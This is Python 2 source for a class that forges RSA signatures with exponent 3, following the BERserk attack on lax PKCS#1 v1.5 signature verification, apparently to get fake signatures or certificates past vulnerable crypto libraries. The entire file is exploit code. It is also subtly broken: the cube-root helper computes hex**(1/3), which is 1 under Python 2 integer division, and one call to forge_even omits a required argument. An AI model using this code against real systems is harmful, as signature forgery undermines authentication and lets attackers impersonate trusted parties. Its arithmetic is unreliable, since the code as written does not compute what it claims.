import hashlib

class Generator():

    @classmethod
    def digest(cls, message):
        return hashlib.sha256(message).hexdigest()

    """This methods have been create with the help of the documentation found here :
    http://www.intelsecurity.com/resources/wp-berserk-analysis-part-1.pdf"""

    @classmethod
    def strToHex(cls, str):
        return str.encode("hex")

    @classmethod
    def hexToInt(cls, hex):
        return int(hex, 16)

    @classmethod
    def intToHex(cls, int):
        return hex(int)

    @classmethod
    def cubeHex(cls, hex):
        return Generator.intToHex(Generator.hexToInt(hex)**3)

    @classmethod
    def icbrt(cls, hex, size):
        b = hex**(1/3)
        return b

    @classmethod
    def forge_prefix(cls, s, hashSize, publicKeyModulo, BITLEN):
        zd = BITLEN - hashSize
        repas = (s << zd)
        repa = (repas >> zd)
        cmax = publicKeyModulo
        ctop = cmax
        cmin = 0
        s = 0
        while True:
            c = (cmax + cmin + 1)/2
            a1 = repas + c
            s = Generator.icbrt(a1, BITLEN)
            a2 = ((s * s * s) >> zd)
            if a2 == repa:
                break
            if c == cmax or c == cmin:
                print " *** Error: The value cannot be found ***"
                return 0
            if a2 > repa:
                cmax = c
            else:
                cmin = c
        for d in range(zd/3, 0, -1):
            mask = ((1 << d) - 1)
            s1 = s & (~mask)
            a2 = ((s1 * s1 * s1) >> zd)
            if a2 == repa:
                return s1
        return s

    @classmethod
    def forge_odd(cls, h, w):
        y = long(1)
        mask = long(1)
        for i in range(1, w):
            mask = mask | (1 << i)
            if (((y**3)^h) & mask) != 0:
                y = y + (1 << i)
        return y

    @classmethod
    def forge_even(cls, h, N, w, BITLEN):
        mask = (1 << w) - 1
        h1 = (h + N) & mask
        s1 = Generator.forge_odd(h1, w)
        y = 0
        for i in range((BITLEN + 5)/3, w, -1):
            y = y | (1 << i)
            c = (y + s1)**3
            if (c > N) and (c < (2 * N)):
                break
            elif c > (2 * N):
                y = y & (~(1 << i))
        return (y + s1)

    @classmethod
    def forge_suffix(cls, h, w, N):
        if (h & 1) == 0:
            return Generator.forge_even(h, N, w)
        else:
            return Generator.forge_odd(h, w)

    @classmethod
    def forge_middle(cls, HASHLEN, signature_high, signature_low, target_EM_middle_mask, target_EM_middle):
        for x in xrange(1, 0xffff):
            signature_middle_x = x << HASHLEN
            signature_x = signature_high | signature_middle_x | signature_low
            em = signature_x**3
            if (em & target_EM_middle_mask == target_EM_middle):
                # forged signature found
                signature = signature_x
                return (x, signature)
